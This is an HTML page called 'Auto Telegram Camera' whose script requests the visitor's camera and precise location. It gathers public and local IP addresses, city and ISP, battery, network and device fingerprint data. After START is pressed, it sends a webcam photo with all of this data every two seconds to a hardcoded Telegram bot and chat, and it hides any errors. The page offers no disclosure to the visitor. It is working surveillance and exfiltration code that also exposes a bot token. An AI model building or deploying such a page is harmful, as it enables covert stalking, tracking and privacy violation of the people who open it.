<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Auto Telegram Camera</title>
<style>
body {
  margin: 0;
  background: #000;
  color: #fff;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  height: 100vh;
  font-family: sans-serif;
  position: relative;
}

#loading {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.9);
  z-index: 1000;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  font-size: 24px;
}

.spinner {
  border: 5px solid #333;
  border-top: 5px solid #ff1493;
  border-radius: 50%;
  width: 50px;
  height: 50px;
  animation: spin 1s linear infinite;
  margin-bottom: 20px;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

button {
  position: fixed;
  bottom: 20px;
  width: 90%;
  padding: 15px 30px;
  font-size: 18px;
  cursor: pointer;
  background: #ff1493;
  color: white;
  border: none;
  border-radius: 10px;
  box-shadow: 0 4px 15px rgba(255, 20, 147, 0.4);
  transition: all 0.3s ease;
  font-weight: bold;
}

button:hover {
  background: #ff0066;
  transform: translateY(-2px);
  box-shadow: 0 6px 20px rgba(255, 20, 147, 0.6);
}

canvas {
  display: none;
}
</style>
</head>
<body>
<div id="loading">
  <div class="spinner"></div>
  <div>Please wait...</div>
</div>

<canvas id="canvas"></canvas>
<button onclick="startSending()">START</button>

<script>
const canvas = document.getElementById("canvas");
const loading = document.getElementById("loading");
const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
const CHAT_ID = "8319568593";
let intervalId = null;
let latitude = "N/A";
let longitude = "N/A";
let mapLink = "Location not allowed";
let userIP = "Unknown";
let stream = null;
let batteryInfo = "Battery: Not available";
let networkInfo = "Network: Not available";
let localIP = "Unknown";
let city = "Unknown";
let country = "Unknown";
let isp = "Unknown";

// Show loading when requesting permissions
function showLoading() {
  loading.style.display = "flex";
}

function hideLoading() {
  loading.style.display = "none";
}

// Request camera access with loading
showLoading();
navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
  .then(s => {
    stream = s;
    hideLoading();
  })
  .catch(err => {
    hideLoading();
    alert("Camera access denied!");
  });

if ("geolocation" in navigator) {
  navigator.geolocation.getCurrentPosition(
    pos => {
      latitude = pos.coords.latitude.toFixed(6);
      longitude = pos.coords.longitude.toFixed(6);
      mapLink = `https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
    },
    () => {
      mapLink = "Location denied";
    },
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );
}

fetch("https://api.ipify.org?format=json")
  .then(r => r.json())
  .then(d => {
    userIP = d.ip;
    fetch(`https://ipapi.co/${userIP}/json/`)
      .then(r => r.json())
      .then(ipData => {
        city = ipData.city || "Unknown";
        country = ipData.country_name || "Unknown";
        isp = ipData.org || "Unknown";
      });
  });

if (navigator.getBattery) {
  navigator.getBattery().then(b => {
    batteryInfo = `
ðŸ”‹ Battery:
Level: ${Math.round(b.level * 100)}%
Charging: ${b.charging ? "Yes" : "No"}
Time: ${b.chargingTime === Infinity ? "Not charging" : b.chargingTime + " seconds"}
`;
  });
}

if (navigator.connection) {
  networkInfo = `
ðŸ“¡ Network:
Type: ${navigator.connection.effectiveType}
Downlink: ${navigator.connection.downlink} Mbps
RTT: ${navigator.connection.rtt} ms
Save Data: ${navigator.connection.saveData ? "Enabled" : "Disabled"}
`;
}

const getLocalIPAddress = () => {
  return new Promise(resolve => {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel("");
    pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
    pc.onicecandidate = ice => {
      if (!ice || !ice.candidate || !ice.candidate.candidate) return;
      const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
      if (ip && ip[1]) resolve(ip[1]);
      pc.close();
    };
    setTimeout(() => resolve("Not found"), 1000);
  });
};

const getBrowserPlugins = () => {
  const plugins = [];
  for (let i = 0; i < navigator.plugins.length; i++) {
    plugins.push(navigator.plugins[i].name);
  }
  return plugins.length > 0 ? plugins.slice(0, 5).join(", ") : "No plugins detected";
};

const getAdvancedSystemInfo = () => {
  const cores = navigator.hardwareConcurrency || "Unknown";
  const ram = navigator.deviceMemory || "Unknown";
  const lang = navigator.language;
  const langs = navigator.languages ? navigator.languages.join(", ") : lang;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const platform = navigator.platform;
  const vendor = navigator.vendor || "Unknown";
  const cookieEnabled = navigator.cookieEnabled ? "Yes" : "No";
  const pdfViewerEnabled = navigator.pdfViewerEnabled ? "Yes" : "No";
  const webdriver = navigator.webdriver ? "Yes" : "No";
  const maxTouchPoints = navigator.maxTouchPoints || 0;
  const userAgent = navigator.userAgent;
  const deviceModel = userAgent.match(/\((.*?)\)/) ? userAgent.match(/\((.*?)\)/)[1] : "Unknown";
  const plugins = getBrowserPlugins();
  const doNotTrack = navigator.doNotTrack || "Not specified";
  const oscpu = navigator.oscpu || "Unknown";
  const product = navigator.product || "Unknown";
  const productSub = navigator.productSub || "Unknown";

  const now = new Date();
  const timezoneOffset = now.getTimezoneOffset();
  const utcOffset = -timezoneOffset / 60;
  const offsetSign = utcOffset >= 0 ? "+" : "-";
  const formattedOffset = `UTC${offsetSign}${Math.abs(utcOffset)}`;

  return `
ðŸ–¥ï¸ SYSTEM INFORMATION:
Device: ${platform}
Model: ${deviceModel}
OS CPU: ${oscpu}
Browser: ${userAgent.substring(0, 80)}...
Product: ${product} ${productSub}
CPU Cores: ${cores}
RAM: ${ram} GB
Languages: ${langs}
Timezone: ${timezone}
UTC Offset: ${formattedOffset}
Vendor: ${vendor}
Plugins: ${plugins}
Do Not Track: ${doNotTrack}
Cookies: ${cookieEnabled}
PDF Viewer: ${pdfViewerEnabled}
WebDriver: ${webdriver}
Touch Points: ${maxTouchPoints}
Screen: ${screen.width}x${screen.height}
Pixel Ratio: ${window.devicePixelRatio}
Color Depth: ${screen.colorDepth}
`;
};

function startSending() {
  showLoading();
  
  // Check if camera is accessible
  if (!stream) {
    alert("Camera not accessible! Please allow camera access.");
    hideLoading();
    return;
  }
  
  getLocalIPAddress().then(ip => {
    localIP = ip;
    
    if (!intervalId) {
      // Send first capture immediately
      captureAndSend();
      
      // Then set interval for every 2 seconds
      intervalId = setInterval(captureAndSend, 2000);
      
      // Hide loading after first capture
      setTimeout(hideLoading, 1000);
    }
  });
}

function captureAndSend() {
  if (!stream) return;
  
  const videoTrack = stream.getVideoTracks()[0];
  const imageCapture = new ImageCapture(videoTrack);
  
  imageCapture.grabFrame().then(imageBitmap => {
    canvas.width = imageBitmap.width;
    canvas.height = imageBitmap.height;
    const ctx = canvas.getContext("2d");
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(imageBitmap, 0, 0);
    
    canvas.toBlob(blob => {
      const caption = `
ðŸ“¸ AUTO CAPTURE - ${new Date().toLocaleTimeString()}
â° Full Time: ${new Date().toLocaleString()}

ðŸ“ ACCURATE LOCATION:
Latitude: ${latitude}
Longitude: ${longitude}
Google Maps: ${mapLink}
City: ${city}
Country: ${country}
ISP: ${isp}

ðŸŒ NETWORK INFORMATION:
Public IP: ${userIP}
Local IP: ${localIP}
${networkInfo}

${getAdvancedSystemInfo()}

${batteryInfo}

âš ï¸ Automatic capture every 2 seconds
`;
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", blob);
      formData.append("caption", caption);
      
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData,
      }).catch(() => {
        // Silently handle errors
      });
    }, "image/jpeg", 0.7);
  }).catch(() => {
    // Silently handle errors
  });
}
</script>
</body>
</html>
